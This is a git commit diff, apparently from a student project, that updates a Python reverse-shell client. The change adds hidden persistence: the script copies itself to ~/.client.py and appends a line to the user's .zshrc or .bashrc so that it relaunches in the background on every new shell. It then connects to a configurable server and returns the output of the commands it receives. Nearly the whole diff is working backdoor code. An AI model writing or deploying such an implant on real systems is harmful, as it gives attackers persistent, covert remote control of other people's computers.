9528c51fbad84c90e6bc8ab3bb3841f956917d8c
Drew Young <dmy3070@rit.edu>
2022-03-18 15:30:27 -0400

    updated persistence to use .zshrc and .bashrc

--- client.py
+++ client.py
@@ -1,21 +1,37 @@
 import socket, subprocess, os, sys
-with open(f"{os.path.expanduser('~')}/.zshrc","r",) as file:
+'''
+First, make this script start every time the user starts their computer, or a new shell.
+'''
+#If they use zshrc, set that to the rcFile to edit
+if os.path.exists(f"{os.path.expanduser('~')}/.zshrc"):
+    rcFile = ".zshrc"
+    NO_PERSISTENCE = False
+#if they don't use zshrc, see if they use bashrc
+elif os.path.exists(f"{os.path.expanduser('~')}/.bashrc"):
+    rcFile = ".bashrc"
+    NO_PERSISTENCE = False
+else:
+    NO_PERSISTENCE = True
+
+#Open their rc file and check if our persistence is already there. If it is, skip this step. If it isn't, make it persistent.
+with open(f"{os.path.expanduser('~')}/{rcFile}","r",) as file:
     if f"python3 {os.path.expanduser('~')}/.client.py &\n" not in file:
         MAKE_PERSISTENT = True
     else:
         MAKE_PERSISTENT = False
 
-if MAKE_PERSISTENT:
-    subprocess.run(f"cp client.py {os.path.expanduser('~')}/.client.py",shell=True)
-    with open(f"{os.path.expanduser('~')}/.zshrc","a",) as file:
+#If we want to make it persistent and a file to edit exists, do it.
+if MAKE_PERSISTENT and not NO_PERSISTENCE: 
+    subprocess.run(f"cp client.py {os.path.expanduser('~')}/.client.py",shell=True) #Copy the client to their home dir and make it .client.py
+    with open(f"{os.path.expanduser('~')}/{rcFile}","a",) as file:
         file.write(f"python3 {os.path.expanduser('~')}/.client.py &\n")
 
 
-SERVER_HOST = "127.0.0.1"
-SERVER_PORT = 8080
+SERVER_HOST = "127.0.0.1" #DEFAULT SERVER HOST
+SERVER_PORT = 8080 #DEFAULT SERVER PORT
 BUFFER_SIZE = 1024 * 128 #128KB max size
 
-
+#If the user sends a custom IP and port
 if len(sys.argv) == 2:
     SERVER_HOST = sys.argv[1]
 elif len(sys.argv) == 3:
@@ -24,7 +40,6 @@ elif len(sys.argv) == 3:
         SERVER_PORT = int(sys.argv[2])
     except:
         print("Can not cast port to int!")
-
     
 s = socket.socket() #Establish socket connection
 s.connect((SERVER_HOST,SERVER_PORT)) #Connect to server
@@ -56,4 +71,5 @@ while True:
             continue
     message = f"{output}" #encapsulate the output and send it
     s.send(message.encode())
-s.close() #close the socket 
+
+s.close() #close the socket on exit
